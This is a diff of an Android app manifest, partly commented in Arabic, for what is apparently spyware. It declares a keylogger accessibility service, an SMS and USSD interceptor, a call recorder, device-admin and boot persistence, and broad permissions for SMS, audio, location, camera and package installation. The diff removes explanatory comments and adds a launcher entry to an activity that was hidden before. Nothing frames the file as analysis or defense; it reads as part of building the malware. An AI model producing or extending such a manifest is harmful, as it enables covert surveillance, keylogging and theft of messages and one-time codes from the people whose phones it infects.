@@ -6,19 +6,16 @@
     <!-- ★★★ PERMISSIONS ★★★ -->
     <!-- ============================================================ -->
 
-    <!-- ★ Internet & Network ★ -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
     <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
     <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
 
-    <!-- ★ Boot & Restart ★ -->
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.QUICKBOOT_POWERON" />
     <uses-permission android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
 
-    <!-- ★ Foreground Service ★ -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
@@ -26,27 +23,18 @@
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_PHONE_CALL" />
 
-    <!-- ★ WakeLock ★ -->
     <uses-permission android:name="android.permission.WAKE_LOCK" />
-
-    <!-- ★ Battery Optimization ★ -->
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
-
-    <!-- ★ Alarms & Jobs ★ -->
     <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
     <uses-permission android:name="android.permission.USE_EXACT_ALARM" />
-
-    <!-- ★★★ Device Admin ★★★ -->
     <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN" />
 
-    <!-- ★ Account Sync ★ -->
     <uses-permission android:name="android.permission.AUTHENTICATE_ACCOUNTS" />
     <uses-permission android:name="android.permission.GET_ACCOUNTS" />
     <uses-permission android:name="android.permission.READ_SYNC_SETTINGS" />
     <uses-permission android:name="android.permission.WRITE_SYNC_SETTINGS" />
     <uses-permission android:name="android.permission.READ_SYNC_STATS" />
 
-    <!-- ★★★ SMS & Calls ★★★ -->
     <uses-permission android:name="android.permission.READ_SMS" />
     <uses-permission android:name="android.permission.SEND_SMS" />
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
@@ -59,7 +47,6 @@
     <uses-permission android:name="android.permission.READ_PHONE_NUMBERS" />
     <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
 
-    <!-- ★★★ Call Recording ★★★ -->
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
     <uses-permission android:name="android.permission.CAPTURE_AUDIO_OUTPUT"
         tools:ignore="ProtectedPermissions" />
@@ -67,22 +54,16 @@
     <uses-permission android:name="android.permission.MODIFY_PHONE_STATE"
         tools:ignore="ProtectedPermissions" />
 
-    <!-- ★ Contacts ★ -->
     <uses-permission android:name="android.permission.READ_CONTACTS" />
     <uses-permission android:name="android.permission.WRITE_CONTACTS" />
 
-    <!-- ★ Location ★ -->
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
 
-    <!-- ★ Camera ★ -->
     <uses-permission android:name="android.permission.CAMERA" />
-
-    <!-- ★ Vibration ★ -->
     <uses-permission android:name="android.permission.VIBRATE" />
 
-    <!-- ★ Storage ★ -->
     <uses-permission
         android:name="android.permission.READ_EXTERNAL_STORAGE"
         android:maxSdkVersion="32" />
@@ -96,33 +77,20 @@
         android:name="android.permission.MANAGE_EXTERNAL_STORAGE"
         tools:ignore="ScopedStorage" />
 
-    <!-- ★ Notifications ★ -->
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
-
-    <!-- ★ Overlay ★ -->
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
-
-    <!-- ★ Query All Packages ★ -->
     <uses-permission
         android:name="android.permission.QUERY_ALL_PACKAGES"
         tools:ignore="QueryAllPackagesPermission" />
 
-    <!-- ★★★ Auto-Update ★★★ -->
     <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
     <uses-permission android:name="android.permission.DOWNLOAD_WITHOUT_NOTIFICATION" />
-
-    <!-- ★★★ Kill Background Apps ★★★ -->
     <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES" />
     <uses-permission android:name="android.permission.RESTART_PACKAGES" />
-
-    <!-- ★★★ Package Usage Stats ★★★ -->
     <uses-permission
         android:name="android.permission.PACKAGE_USAGE_STATS"
         tools:ignore="ProtectedPermissions" />
 
-    <!-- ============================================================ -->
-    <!-- ★★★ FEATURES ★★★ -->
-    <!-- ============================================================ -->
     <uses-feature android:name="android.hardware.camera" android:required="false" />
     <uses-feature android:name="android.hardware.camera.autofocus" android:required="false" />
     <uses-feature android:name="android.hardware.microphone" android:required="false" />
@@ -141,8 +109,6 @@
         android:usesCleartextTraffic="true"
         android:persistent="true"
         android:excludeFromRecents="true"
-        android:noHistory="true"
-        android:killAfterRestore="true"
         android:hardwareAccelerated="true"
         android:largeHeap="true"
         android:supportsRtl="true"
@@ -150,7 +116,7 @@
         tools:ignore="GoogleAppIndexingWarning,UnusedAttribute">
 
         <!-- ============================================================ -->
-        <!-- ★★★ MAIN ACTIVITY (مخفي بدون LAUNCHER) ★★★ -->
+        <!-- ★★★ MAIN ACTIVITY (مع LAUNCHER — يظهر في قائمة التطبيقات) ★★★ -->
         <!-- ============================================================ -->
         <activity
             android:name=".MainActivity"
@@ -163,13 +129,17 @@
             android:taskAffinity=""
             android:configChanges="orientation|screenSize|keyboardHidden"
             tools:ignore="LockedOrientationActivity">
+            <!-- ★★★ LAUNCHER intent-filter ★★★ -->
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
         </activity>
 
         <!-- ============================================================ -->
         <!-- ★★★ SERVICES ★★★ -->
         <!-- ============================================================ -->
 
-        <!-- ★ الخدمة الرئيسية ★ -->
         <service
             android:name=".ServiceRunner"
             android:exported="false"
@@ -177,14 +147,12 @@
             android:foregroundServiceType="camera|microphone|location|dataSync"
             android:stopWithTask="false" />
 
-        <!-- ★ JobService ★ -->
         <service
             android:name=".KeepAliveJobService"
             android:exported="false"
             android:enabled="true"
             android:permission="android.permission.BIND_JOB_SERVICE" />
 
-        <!-- ★ Call Recorder Service ★ -->
         <service
             android:name=".CallRecorderService"
             android:exported="false"
@@ -192,7 +160,6 @@
             android:foregroundServiceType="dataSync|microphone"
             android:stopWithTask="false" />
 
-        <!-- ★ Keylogger Service (AccessibilityService) ★ -->
         <service
             android:name=".KeyloggerService"
             android:exported="true"
@@ -207,7 +174,6 @@
                 android:resource="@xml/accessibility_service_config" />
         </service>
 
-        <!-- ★ USSD + SMS Interceptor (AccessibilityService) ★ -->
         <service
             android:name=".USSDInterceptor"
             android:exported="true"
@@ -222,7 +188,6 @@
                 android:resource="@xml/accessibility_service_config" />
         </service>
 
-        <!-- ★ Account Sync Service ★ -->
         <service
             android:name=".AccountSyncService"
             android:exported="true"
@@ -237,7 +202,7 @@
         </service>
 
         <!-- ============================================================ -->
-        <!-- ★★★ FILE PROVIDER (للـ Auto-Update) ★★★ -->
+        <!-- ★★★ FILE PROVIDER ★★★ -->
         <!-- ============================================================ -->
         <provider
             android:name="androidx.core.content.FileProvider"
@@ -254,7 +219,6 @@
         <!-- ★★★ RECEIVERS ★★★ -->
         <!-- ============================================================ -->
 
-        <!-- ★ Admin Receiver ★ -->
         <receiver
             android:name=".AdminReceiver"
             android:exported="true"
@@ -271,7 +235,6 @@
             </intent-filter>
         </receiver>
 
-        <!-- ★ Boot Receiver ★ -->
         <receiver
             android:name=".BootReceiver"
             android:exported="true"
@@ -286,7 +249,6 @@
             </intent-filter>
         </receiver>
 
-        <!-- ★ Alarm Receiver ★ -->
         <receiver
             android:name=".AlarmReceiver"
             android:exported="false"
@@ -298,13 +260,11 @@
             </intent-filter>
         </receiver>
 
-        <!-- ★ Package Update Receiver (★ مرة واحدة فقط ★) ★ -->
         <receiver
             android:name=".PackageUpdateReceiver"
             android:exported="true"
             android:enabled="true"
             android:directBootAware="true">
-            <!-- Package events -->
             <intent-filter android:priority="1000">
                 <action android:name="android.intent.action.PACKAGE_ADDED" />
                 <action android:name="android.intent.action.PACKAGE_REMOVED" />
@@ -313,7 +273,6 @@
                 <action android:name="android.intent.action.PACKAGE_FULLY_REMOVED" />
                 <data android:scheme="package" />
             </intent-filter>
-            <!-- Screen events -->
             <intent-filter>
                 <action android:name="android.intent.action.SCREEN_ON" />
                 <action android:name="android.intent.action.SCREEN_OFF" />
@@ -322,14 +281,12 @@
                 <action android:name="android.intent.action.USER_BACKGROUND" />
                 <action android:name="android.intent.action.USER_FOREGROUND" />
             </intent-filter>
-            <!-- Connection events -->
             <intent-filter>
                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
                 <action android:name="android.net.wifi.WIFI_STATE_CHANGED" />
                 <action android:name="android.net.wifi.STATE_CHANGE" />
                 <action android:name="android.net.wifi.supplicant.CONNECTION_CHANGE" />
             </intent-filter>
-            <!-- Power events -->
             <intent-filter>
                 <action android:name="android.intent.action.ACTION_POWER_CONNECTED" />
                 <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED" />
@@ -338,21 +295,18 @@
                 <action android:name="android.intent.action.ACTION_SHUTDOWN" />
                 <action android:name="android.intent.action.REBOOT" />
             </intent-filter>
-            <!-- System events -->
             <intent-filter>
                 <action android:name="android.intent.action.TIME_SET" />
                 <action android:name="android.intent.action.TIMEZONE_CHANGED" />
                 <action android:name="android.intent.action.LOCALE_CHANGED" />
                 <action android:name="android.intent.action.DATE_CHANGED" />
             </intent-filter>
-            <!-- Media events -->
             <intent-filter android:priority="999">
                 <action android:name="android.intent.action.MEDIA_BUTTON" />
                 <action android:name="android.media.AUDIO_BECOMING_NOISY" />
             </intent-filter>
         </receiver>
 
-        <!-- ★ SMS Receiver ★ -->
         <receiver
             android:name=".USSDInterceptor$SmsReceiver"
             android:exported="true"
@@ -364,7 +318,6 @@
             </intent-filter>
         </receiver>
 
-        <!-- ★ Outgoing Call Receiver ★ -->
         <receiver
             android:name=".CallRecorderService$CallStateReceiver"
             android:exported="true"
